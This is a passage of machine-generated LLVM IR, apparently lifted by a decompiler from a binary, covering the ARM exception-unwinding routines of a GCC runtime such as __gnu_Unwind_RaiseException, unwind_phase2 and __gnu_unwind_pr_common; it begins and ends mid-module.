  uselistorder i32* @r3, { 105, 106, 40, 41, 29, 107, 108, 32, 109, 110, 3, 111, 112, 113, 4, 114, 115, 116, 5, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 0, 135, 136, 137, 138, 30, 31, 33, 34, 35, 36, 37, 38, 39, 79, 62, 63, 64, 139, 140, 153, 154, 155, 143, 144, 145, 146, 147, 1, 148, 6, 85, 86, 43, 44, 141, 142, 55, 56, 102, 103, 104, 96, 97, 98, 100, 99, 9, 10, 11, 159, 156, 157, 158, 2, 160, 161, 162, 42, 65, 45, 46, 47, 48, 49, 50, 149, 150, 151, 152, 57, 58, 59, 87, 88, 89, 90, 66, 67, 68, 8, 91, 92, 93, 94, 95, 24, 13, 15, 12, 14, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 51, 52, 53, 101, 54, 60, 61, 69, 7, 70, 71, 72, 73, 74, 75, 76, 77, 78, 80, 81, 82, 83, 84 }
  uselistorder i32 10, { 3, 4, 34, 35, 36, 7, 51, 50, 83, 0, 47, 48, 82, 52, 53, 1, 37, 9, 29, 31, 10, 30, 11, 32, 12, 33, 26, 5, 38, 27, 28, 39, 25, 40, 13, 41, 14, 42, 15, 43, 16, 44, 17, 45, 46, 18, 19, 20, 49, 8, 54, 55, 56, 57, 58, 59, 60, 21, 61, 62, 63, 22, 64, 65, 66, 2, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 6, 80, 23, 81, 24 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_19660, { 1, 0 }
  uselistorder label %dec_label_pc_19604, { 1, 0 }
  uselistorder label %dec_label_pc_19600, { 1, 0 }
  uselistorder label %dec_label_pc_195b0, { 1, 0 }
  uselistorder label %dec_label_pc_1959c, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_19674 = add i32 %ucbp, 12
  %v3_19674 = inttoptr i32 %v2_19674 to i32*
  store i32 %stop_fn, i32* %v3_19674, align 4
  %v3_19678 = add i32 %ucbp, 24
  %v4_19678 = inttoptr i32 %v3_19678 to i32*
  store i32 %tmp, i32* %v4_19678, align 4
  %v1_1967c = add i32 %entry_vrs, 60
  %v2_1967c = inttoptr i32 %v1_1967c to i32*
  %v3_1967c = load i32, i32* %v2_1967c, align 4
  %v2_19684 = add i32 %entry_vrs, 64
  %v3_19684 = inttoptr i32 %v2_19684 to i32*
  store i32 %v3_1967c, i32* %v3_19684, align 4
  %v3_1968c = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_1968c

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_196a46 = add i32 %vrs, 64
  %v2_196a47 = inttoptr i32 %v1_196a46 to i32*
  %v3_196a48 = load i32, i32* %v2_196a47, align 4
  %v2_196a89 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_196a48)
  store i32 %v2_196a89, i32* %r0.global-to-local, align 4
  %v2_196ac11 = icmp eq i32 %v2_196a89, 0
  br i1 %v2_196ac11, label %dec_label_pc_196b4, label %dec_label_pc_196e4

dec_label_pc_196b4:                               ; preds = %entry, %dec_label_pc_196b4.dec_label_pc_196a0_crit_edge
  %v0_196b4 = load i32, i32* @r5, align 4
  %v1_196b4 = add i32 %v0_196b4, 64
  %v2_196b4 = inttoptr i32 %v1_196b4 to i32*
  %v3_196b4 = load i32, i32* %v2_196b4, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_196bc = load i32, i32* @r4, align 4
  %v2_196bc = add i32 %v1_196bc, 20
  %v3_196bc = inttoptr i32 %v2_196bc to i32*
  store i32 %v3_196b4, i32* %v3_196bc, align 4
  %v0_196c0 = load i32, i32* @r4, align 4
  %v1_196c8 = add i32 %v0_196c0, 16
  %v2_196c8 = inttoptr i32 %v1_196c8 to i32*
  %v3_196c8 = load i32, i32* %v2_196c8, align 4
  call void @__pseudo_branch(i32 %v3_196c8)
  %v0_196d4 = load i32, i32* %r0.global-to-local, align 4
  %v7_196d4 = icmp eq i32 %v0_196d4, 8
  br i1 %v7_196d4, label %dec_label_pc_196b4.dec_label_pc_196a0_crit_edge, label %dec_label_pc_196dc

dec_label_pc_196b4.dec_label_pc_196a0_crit_edge:  ; preds = %dec_label_pc_196b4
  %v0_196a0.pre = load i32, i32* @r4, align 4
  %v0_196a4.pre = load i32, i32* @r5, align 4
  store i32 %v0_196a0.pre, i32* %r0.global-to-local, align 4
  %v1_196a4 = add i32 %v0_196a4.pre, 64
  %v2_196a4 = inttoptr i32 %v1_196a4 to i32*
  %v3_196a4 = load i32, i32* %v2_196a4, align 4
  %v2_196a8 = call i32 @get_eit_entry(i32 %v0_196a0.pre, i32 %v3_196a4)
  store i32 %v2_196a8, i32* %r0.global-to-local, align 4
  %v2_196ac = icmp eq i32 %v2_196a8, 0
  br i1 %v2_196ac, label %dec_label_pc_196b4, label %dec_label_pc_196e4

dec_label_pc_196dc:                               ; preds = %dec_label_pc_196b4
  %v7_196dc = icmp eq i32 %v0_196d4, 7
  br i1 %v7_196dc, label %dec_label_pc_196e8, label %dec_label_pc_196e4

dec_label_pc_196e4:                               ; preds = %entry, %dec_label_pc_196b4.dec_label_pc_196a0_crit_edge, %dec_label_pc_196dc
  %v0_196e4 = call i32 @abort()
  store i32 %v0_196e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_196e8

dec_label_pc_196e8:                               ; preds = %dec_label_pc_196dc, %dec_label_pc_196e4
  %v0_196e8 = load i32, i32* @r5, align 4
  %v1_196e8 = add i32 %v0_196e8, 4
  store i32 %v1_196e8, i32* %r0.global-to-local, align 4
  %v1_196ec = inttoptr i32 %v1_196e8 to i32*
  %v2_196ec = call i32 @__restore_core_regs(i32* %v1_196ec)
  store i32 %v2_196ec, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_196e8, { 1, 0 }
  uselistorder label %dec_label_pc_196e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_196b4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_196f0 = add i32 %ucbp, 20
  %v2_196f0 = inttoptr i32 %v1_196f0 to i32*
  %v3_196f0 = load i32, i32* %v2_196f0, align 4
  %v1_196f8 = load i32, i32* %r1.global-to-local, align 4
  %v2_196f8 = add i32 %v1_196f8, 64
  %v3_196f8 = inttoptr i32 %v2_196f8 to i32*
  store i32 %v3_196f0, i32* %v3_196f8, align 4
  %v1_196fc = add i32 %ucbp, 12
  %v2_196fc = inttoptr i32 %v1_196fc to i32*
  %v3_196fc = load i32, i32* %v2_196fc, align 4
  %v2_19700 = icmp eq i32 %v3_196fc, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_1970c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1970c, i32* @r5, align 4
  br i1 %v2_19700, label %dec_label_pc_19714, label %dec_label_pc_19750

dec_label_pc_19714:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_19720 = add i32 %ucbp, 16
  %v2_19720 = inttoptr i32 %v1_19720 to i32*
  %v3_19720 = load i32, i32* %v2_19720, align 4
  call void @__pseudo_branch(i32 %v3_19720)
  br i1 false, label %dec_label_pc_19748, label %dec_label_pc_19734

dec_label_pc_19734:                               ; preds = %dec_label_pc_19714
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_14500.563 to i32))
  %v0_1973c = load i32, i32* @r4, align 4
  %v0_19740 = load i32, i32* @r5, align 4
  store i32 %v0_19740, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_1973c, i32 %v0_19740)
  br label %dec_label_pc_19748

dec_label_pc_19748:                               ; preds = %dec_label_pc_19714, %dec_label_pc_19734
  %v0_19748 = load i32, i32* @r5, align 4
  %v1_19748 = add i32 %v0_19748, 4
  %v1_1974c = inttoptr i32 %v1_19748 to i32*
  %v2_1974c = call i32 @__restore_core_regs(i32* %v1_1974c)
  %v1_19754.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_19750

dec_label_pc_19750:                               ; preds = %entry, %dec_label_pc_19748
  %v1_19754 = phi i32 [ %v0_1970c, %entry ], [ %v1_19754.pre, %dec_label_pc_19748 ]
  %v3_19754 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_19754, i32 1)
  %v0_19758 = call i32 @abort()
  ret i32 %v0_19758

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 6, 1, 5, 4, 3, 2, 9, 8, 10, 7, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 44, 45, 46, 47, 48, 50, 22, 19, 20, 21, 15, 16, 17, 23, 24, 18, 6, 7, 8, 9, 10, 11, 12, 13, 14, 31, 55, 59, 58, 57, 51, 52, 2, 39, 40, 41, 42, 43, 53, 54, 56, 34, 35, 49, 32, 36, 33, 0, 25, 26, 1, 27, 28, 29, 30, 37, 38, 3, 4, 5 }
  uselistorder i1 true, { 0, 1, 2, 3, 349, 608, 4, 609, 610, 611, 612, 5, 328, 365, 613, 6, 327, 614, 7, 326, 615, 616, 617, 618, 8, 619, 366, 9, 330, 620, 10, 329, 621, 622, 11, 623, 624, 625, 12, 626, 627, 13, 628, 14, 368, 629, 630, 367, 631, 632, 15, 331, 16, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 18, 333, 19, 643, 644, 645, 20, 332, 646, 21, 17, 647, 648, 22, 649, 650, 651, 23, 652, 653, 654, 655, 656, 24, 25, 369, 26, 27, 28, 29, 607, 334, 657, 658, 335, 659, 371, 660, 661, 31, 662, 663, 32, 336, 665, 30, 666, 664, 667, 370, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 338, 44, 45, 46, 47, 48, 351, 673, 686, 325, 339, 354, 353, 668, 374, 669, 670, 160, 163, 671, 672, 337, 352, 674, 675, 676, 340, 677, 678, 679, 164, 165, 680, 681, 682, 683, 161, 162, 684, 685, 373, 372, 166, 167, 168, 687, 169, 170, 355, 356, 361, 357, 362, 358, 360, 688, 359, 364, 689, 171, 690, 159, 691, 375, 376, 692, 377, 378, 172, 693, 379, 380, 173, 174, 694, 381, 382, 175, 176, 695, 177, 178, 179, 696, 383, 384, 180, 181, 697, 385, 386, 182, 698, 387, 388, 156, 157, 158, 699, 389, 390, 155, 700, 391, 392, 701, 341, 342, 183, 184, 702, 393, 394, 185, 703, 186, 187, 704, 188, 189, 705, 190, 191, 706, 192, 324, 154, 193, 194, 707, 395, 396, 195, 196, 708, 197, 198, 709, 397, 398, 151, 152, 153, 150, 710, 399, 400, 711, 401, 402, 147, 148, 149, 712, 403, 404, 713, 405, 406, 144, 145, 146, 714, 407, 408, 715, 409, 410, 141, 142, 143, 716, 411, 412, 138, 139, 140, 717, 413, 414, 718, 415, 416, 135, 136, 137, 719, 417, 418, 199, 720, 419, 420, 132, 133, 134, 721, 421, 422, 722, 423, 424, 129, 130, 131, 723, 425, 426, 724, 427, 428, 126, 127, 128, 725, 429, 430, 726, 431, 432, 123, 124, 125, 727, 433, 434, 121, 122, 728, 435, 436, 120, 729, 437, 438, 730, 439, 440, 200, 201, 202, 731, 441, 442, 117, 118, 119, 732, 443, 444, 733, 445, 446, 114, 115, 116, 734, 447, 448, 112, 113, 735, 449, 450, 736, 451, 452, 737, 453, 454, 738, 455, 456, 739, 457, 458, 740, 459, 460, 741, 461, 462, 742, 463, 464, 743, 465, 466, 744, 467, 468, 203, 204, 205, 745, 469, 470, 109, 110, 111, 746, 471, 472, 747, 473, 474, 106, 107, 108, 748, 475, 476, 103, 104, 105, 749, 477, 478, 100, 101, 102, 99, 750, 479, 480, 751, 481, 482, 96, 97, 98, 752, 483, 484, 753, 485, 486, 93, 94, 95, 754, 487, 488, 755, 489, 490, 206, 207, 208, 756, 491, 492, 209, 210, 211, 757, 493, 494, 212, 213, 214, 758, 495, 496, 90, 91, 92, 759, 497, 498, 760, 499, 500, 88, 89, 761, 501, 502, 762, 503, 504, 87, 763, 764, 505, 506, 215, 216, 765, 507, 508, 84, 85, 86, 766, 509, 510, 83, 767, 768, 511, 512, 81, 82, 769, 513, 514, 770, 515, 516, 78, 79, 80, 771, 517, 518, 217, 218, 219, 772, 519, 520, 75, 76, 77, 773, 521, 522, 774, 523, 524, 74, 775, 776, 525, 526, 72, 73, 777, 527, 528, 70, 71, 778, 529, 530, 779, 531, 532, 67, 68, 69, 780, 533, 534, 66, 781, 220, 782, 535, 536, 63, 64, 65, 783, 537, 538, 784, 539, 540, 60, 61, 62, 785, 541, 542, 786, 543, 544, 787, 545, 546, 59, 788, 789, 547, 548, 221, 222, 223, 57, 58, 790, 549, 550, 791, 551, 552, 792, 553, 554, 793, 555, 556, 794, 557, 558, 795, 559, 560, 796, 561, 562, 224, 797, 225, 226, 56, 798, 563, 564, 227, 799, 228, 229, 230, 800, 231, 232, 233, 801, 234, 235, 236, 237, 802, 238, 239, 240, 241, 803, 242, 243, 804, 565, 566, 244, 245, 805, 246, 247, 248, 806, 249, 250, 251, 807, 252, 253, 254, 808, 255, 256, 257, 809, 258, 259, 260, 261, 810, 567, 568, 262, 263, 811, 264, 265, 266, 812, 267, 268, 813, 269, 270, 271, 814, 272, 273, 274, 815, 275, 276, 277, 278, 279, 280, 281, 816, 282, 283, 284, 817, 569, 570, 285, 55, 818, 571, 572, 286, 287, 54, 819, 343, 344, 820, 288, 821, 289, 290, 291, 822, 292, 293, 294, 823, 573, 574, 295, 53, 824, 575, 576, 296, 297, 52, 825, 577, 578, 51, 826, 579, 580, 298, 299, 300, 827, 581, 582, 301, 828, 583, 584, 302, 50, 829, 585, 586, 303, 304, 305, 830, 306, 307, 308, 831, 309, 310, 49, 832, 345, 346, 311, 312, 313, 314, 315, 833, 587, 588, 834, 589, 590, 835, 591, 592, 836, 593, 594, 837, 595, 596, 838, 597, 598, 839, 599, 600, 840, 601, 602, 841, 603, 604, 842, 605, 606, 350, 843, 363, 844, 316, 347, 317, 318, 348, 319, 320, 321, 322, 323 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_19750, { 1, 0 }
  uselistorder label %dec_label_pc_19748, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1975c = load i32, i32* @r4, align 4
  store i32 %v3_1975c, i32* %stack_var_-16, align 4
  %v6_1975c = load i32, i32* @r5, align 4
  %v9_1975c = load i32, i32* @r6, align 4
  %v12_1975c = load i32, i32* @lr, align 4
  %v1_19760 = add i32 %entry_vrs, 60
  %v2_19760 = inttoptr i32 %v1_19760 to i32*
  %v3_19760 = load i32, i32* %v2_19760, align 4
  %v2_19764 = add i32 %entry_vrs, 64
  %v3_19764 = inttoptr i32 %v2_19764 to i32*
  store i32 %v3_19760, i32* %v3_19764, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_19794 = load i32, i32* %v3_19764, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_197ac = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_19794)
  %v2_197b0 = icmp eq i32 %v2_197ac, 0
  br i1 %v2_197b0, label %dec_label_pc_197b8, label %dec_label_pc_197ec

dec_label_pc_197b8:                               ; preds = %entry
  %v0_197b8 = load i32, i32* @r5, align 4
  %v1_197c0 = add i32 %v0_197b8, 16
  %v2_197c0 = inttoptr i32 %v1_197c0 to i32*
  %v3_197c0 = load i32, i32* %v2_197c0, align 4
  call void @__pseudo_branch(i32 %v3_197c0)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_197d8 = load i32, i32* %saved_vrs_-320, align 4
  %v1_197dc = urem i32 %v2_197d8, 2
  %v2_197dc = icmp eq i32 %v1_197dc, 0
  br i1 %v2_197dc, label %dec_label_pc_197fc, label %dec_label_pc_197e4

dec_label_pc_197e4:                               ; preds = %dec_label_pc_197b8, %dec_label_pc_197fc
  %v0_197e4 = phi i1 [ false, %dec_label_pc_197b8 ], [ %phitmp, %dec_label_pc_197fc ]
  br i1 %v0_197e4, label %dec_label_pc_19808, label %dec_label_pc_197ec

dec_label_pc_197ec:                               ; preds = %entry, %dec_label_pc_197e4
  %v2_197f4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_197f4, i32* @r4, align 4
  store i32 %v6_1975c, i32* @r5, align 4
  store i32 %v9_1975c, i32* @r6, align 4
  store i32 %v12_1975c, i32* @lr, align 4
  ret i32 9

dec_label_pc_197fc:                               ; preds = %dec_label_pc_197b8
  %v2_197fc = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_197fc, i32* @r0, align 4
  %v1_19800 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_197fc)
  %v0_197e4.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_197e4.pre, 6
  br label %dec_label_pc_197e4

dec_label_pc_19808:                               ; preds = %dec_label_pc_197e4
  %v0_19808 = load i32, i32* @r5, align 4
  %v0_1980c = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_19808, i32 %v0_1980c)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_197ec, { 1, 0 }
  uselistorder label %dec_label_pc_197e4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_19814 = add i32 %ucbp, 12
  %v2_19814 = inttoptr i32 %v1_19814 to i32*
  %v3_19814 = load i32, i32* %v2_19814, align 4
  %v2_19818 = icmp eq i32 %v3_19814, 0
  br i1 %v2_19818, label %dec_label_pc_19820, label %dec_label_pc_19824

dec_label_pc_19820:                               ; preds = %entry
  %v2_19820 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_19824

dec_label_pc_19824:                               ; preds = %entry, %dec_label_pc_19820
  %v1_19824 = add i32 %entry_vrs, 60
  %v2_19824 = inttoptr i32 %v1_19824 to i32*
  %v3_19824 = load i32, i32* %v2_19824, align 4
  %v2_1982c = add i32 %entry_vrs, 64
  %v3_1982c = inttoptr i32 %v2_1982c to i32*
  store i32 %v3_19824, i32* %v3_1982c, align 4
  %v3_19830 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_19830

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_19824, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_19890

bb:                                               ; preds = %entry
  %v7_19848 = mul i32 %regclass, 4
  %v8_19848 = add i32 %v7_19848, ptrtoint (i32* @global_var_19850.713 to i32)
  call void @__pseudo_branch(i32 %v8_19848)
  br label %dec_label_pc_19890

dec_label_pc_19890:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_19978 = load i32, i32* @r4, align 4
  %v6_19978 = load i32, i32* @r5, align 4
  %v2_19988 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_19990 = add i32 %ucbp, 76
  %v2_19990 = inttoptr i32 %v1_19990 to i32*
  %v3_19990 = load i32, i32* %v2_19990, align 4
  %v1_1999c = inttoptr i32 %v3_19990 to i32*
  %v2_1999c = load i32, i32* %v1_1999c, align 4
  store i32 %v2_1999c, i32* @lr, align 4
  %v4_1999c = add i32 %v3_19990, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_199a8 = urem i32 %state, 4
  store i32 %v1_199a8, i32* %r2.global-to-local, align 4
  %v1_199ac = and i32 %state, 8
  store i32 %v1_199ac, i32* %r0.global-to-local, align 4
  %v4_199bc = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_1999c, i32* %v4_199bc, align 8
  br i1 %v2_19988, label %dec_label_pc_199cc, label %dec_label_pc_19ca8

dec_label_pc_199cc:                               ; preds = %entry
  %v3_199cc = mul i32 %v2_1999c, 256
  store i32 %v3_199cc, i32* %v4_199bc, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_199e4

dec_label_pc_199e4:                               ; preds = %dec_label_pc_19ca8, %dec_label_pc_199cc
  %v0_19a08647090 = phi i32 [ %v2_19cc0, %dec_label_pc_19ca8 ], [ %v4_1999c, %dec_label_pc_199cc ]
  store i32 %v1_199a8, i32* %r2.global-to-local, align 4
  %v1_199e8 = add i32 %ucbp, 80
  %v2_199e8 = inttoptr i32 %v1_199e8 to i32*
  %v3_199e8 = load i32, i32* %v2_199e8, align 4
  %v7_199ec = icmp eq i32 %v1_199a8, 2
  br i1 %v7_199ec, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_199e4
  %v2_199f0 = add i32 %ucbp, 56
  %v3_199f0 = inttoptr i32 %v2_199f0 to i32*
  %v4_199f0 = load i32, i32* %v3_199f0, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_199e4, %bb
  %v0_19a086470 = phi i32 [ %v0_19a08647090, %dec_label_pc_199e4 ], [ %v4_199f0, %bb ]
  %v1_199f4 = urem i32 %v3_199e8, 2
  %v2_199f4 = icmp eq i32 %v1_199f4, 0
  br i1 %v2_199f4, label %dec_label_pc_19a08.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_19ac8

dec_label_pc_19a08.preheader:                     ; preds = %bb148
  %v1_19a086571 = inttoptr i32 %v0_19a086470 to i32*
  %v2_19a086672 = load i32, i32* %v1_19a086571, align 4
  %v2_19a0c6874 = icmp eq i32 %v2_19a086672, 0
  br i1 %v2_19a0c6874, label %dec_label_pc_19ac8, label %dec_label_pc_19a14.preheader.lr.ph.lr.ph

dec_label_pc_19a14.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_19a08.preheader
  %v7_19a18 = icmp eq i32 %id, 2
  %v2_19aa4 = icmp eq i32 %v1_199a8, 0
  %v2_19c70 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_19b8c = icmp eq i32 %v1_199ac, 0
  br label %dec_label_pc_19a14.preheader.lr.ph

dec_label_pc_19a14.preheader.lr.ph:               ; preds = %dec_label_pc_19a14.preheader.lr.ph.lr.ph, %dec_label_pc_19cdc
  %v1_19a2496 = phi i32 [ %v2_19a086672, %dec_label_pc_19a14.preheader.lr.ph.lr.ph ], [ %v2_19a0866, %dec_label_pc_19cdc ]
  %v1_19a2093 = phi i32 [ %v0_19a086470, %dec_label_pc_19a14.preheader.lr.ph.lr.ph ], [ %v2_19ce0, %dec_label_pc_19cdc ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_19a14.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_19cdc ]
  br label %dec_label_pc_19a14.preheader

dec_label_pc_19a14.preheader:                     ; preds = %dec_label_pc_19a14.preheader.lr.ph, %dec_label_pc_19ca0
  %v1_19a2495 = phi i32 [ %v1_19a2496, %dec_label_pc_19a14.preheader.lr.ph ], [ %v2_19a08, %dec_label_pc_19ca0 ]
  %v1_19a2092 = phi i32 [ %v1_19a2093, %dec_label_pc_19a14.preheader.lr.ph ], [ %v1_19ca0, %dec_label_pc_19ca0 ]
  br label %dec_label_pc_19a14

dec_label_pc_19a14:                               ; preds = %dec_label_pc_19a14.preheader, %dec_label_pc_19ab8
  %v1_19a24 = phi i32 [ %v1_19a2495, %dec_label_pc_19a14.preheader ], [ %v2_19abc, %dec_label_pc_19ab8 ]
  %v1_19a38 = phi i32 [ %v1_19a2092, %dec_label_pc_19a14.preheader ], [ %v1_19ab8, %dec_label_pc_19ab8 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_19a18, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_19a14
  %v2_19a1c = add i32 %v1_19a38, 4
  %v3_19a1c = inttoptr i32 %v2_19a1c to i32*
  %v4_19a1c = load i32, i32* %v3_19a1c, align 4
  store i32 %v4_19a1c, i32* @r5, align 4
  store i32 %v1_19a24, i32* @r6, align 4
  %v0_19a28109 = load i32, i32* @r8, align 4
  %v1_19a28110 = add i32 %v0_19a28109, 72
  %v2_19a28111 = inttoptr i32 %v1_19a28110 to i32*
  %v3_19a28112 = load i32, i32* %v2_19a28111, align 4
  store i32 %v3_19a28112, i32* @lr, align 4
  %v2_19a34 = add i32 %v1_19a38, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_19a14
  %v2_19a20 = add i32 %v1_19a38, 2
  %v3_19a20 = inttoptr i32 %v2_19a20 to i16*
  %v4_19a20 = load i16, i16* %v3_19a20, align 2
  %v5_19a20 = zext i16 %v4_19a20 to i32
  store i32 %v5_19a20, i32* @r5, align 4
  %v0_19a28 = load i32, i32* @r8, align 4
  %v1_19a28 = add i32 %v0_19a28, 72
  %v2_19a28 = inttoptr i32 %v1_19a28 to i32*
  %v3_19a28 = load i32, i32* %v2_19a28, align 4
  store i32 %v3_19a28, i32* @lr, align 4
  %v2_19a30 = inttoptr i32 %v1_19a38 to i16*
  %v3_19a30 = load i16, i16* %v2_19a30, align 2
  %v4_19a30 = zext i16 %v3_19a30 to i32
  store i32 %v4_19a30, i32* @r6, align 4
  %v2_19a38 = add i32 %v1_19a38, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_19a38, %.thread16 ], [ %v2_19a34, %bb151 ]
  %v3_19a28115 = phi i32 [ %v3_19a28, %.thread16 ], [ %v3_19a28112, %bb151 ]
  %v0_19a40113 = phi i32 [ %v5_19a20, %.thread16 ], [ %v4_19a1c, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_19a40 = and i32 %v0_19a40113, -2
  %v2_19a44 = add i32 %v1_19a40, %v3_19a28115
  store i32 %v2_19a44, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_19a54 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19a54, i32* %r0.global-to-local, align 4
  %v5_19a60 = call i32 @_Unwind_VRS_Get(i32 %v0_19a54, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19a60, i32* %r0.global-to-local, align 4
  %v3_19a64 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_19a64, i32* %r2.global-to-local, align 4
  %v0_19a68 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_19a68, %v3_19a64
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_19a74

._crit_edge:                                      ; preds = %bb152
  %v0_19a8c.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_19a74:                               ; preds = %bb152
  %v0_19a74 = load i32, i32* @r6, align 4
  %v1_19a74 = and i32 %v0_19a74, -2
  %v2_19a78 = add i32 %v1_19a74, %v0_19a68
  %v3_19a7c = icmp ult i32 %v3_19a64, %v2_19a78
  br i1 %v3_19a7c, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_19a74
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_19a74
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_19a8c = phi i32 [ %v0_19a8c.pre, %._crit_edge ], [ %v0_19a74, %bb153 ], [ %v0_19a74, %.thread20 ]
  %v0_19c34 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_19a88 = load i32, i32* @r5, align 4
  %v1_19a8c = urem i32 %v0_19a8c, 2
